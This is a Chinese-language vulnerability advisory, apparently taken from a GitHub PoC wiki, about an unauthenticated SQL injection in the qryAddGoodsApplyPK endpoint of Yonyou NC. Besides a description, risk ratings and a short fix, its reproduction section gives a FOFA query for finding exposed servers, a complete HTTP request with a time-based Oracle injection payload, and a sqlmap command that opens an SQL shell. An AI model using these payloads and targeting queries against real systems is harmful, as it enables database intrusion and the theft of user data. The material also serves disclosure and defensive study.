# 用友NC-qryaddgoodsapplypk-sql注入漏洞预警

# 漏洞描述

用友NC-qryaddgoodsapplypk-sql注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。

# 影响范围

用友 NC

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/Client/Uclient/UClient.exe" || body="ufida.ico" || body="nccloud" || icon_hash="1085941792"

POC/EXP：

GET /ebvp/other/qryAddGoodsApplyPK;.js?billno=1%27+AND+7554%3dDBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(87)||CHR(74)||CHR(112),10)+AND+%27ldrk%27%3d%27ldrk HTTP/1.1
Host: 127.0.0.1:9999
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20240403144027629](./.resource/用友NC-qryaddgoodsapplypk-sql注入漏洞/media/image-20240403144027629.png)


 sqlmap.py -u "http://127.0.0.1:9999/ebvp/other/qryAddGoodsApplyPK;.js?billno=1*" --sql-shell

![image-20240403144044557](./.resource/用友NC-qryaddgoodsapplypk-sql注入漏洞/media/image-20240403144044557.png)


# 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
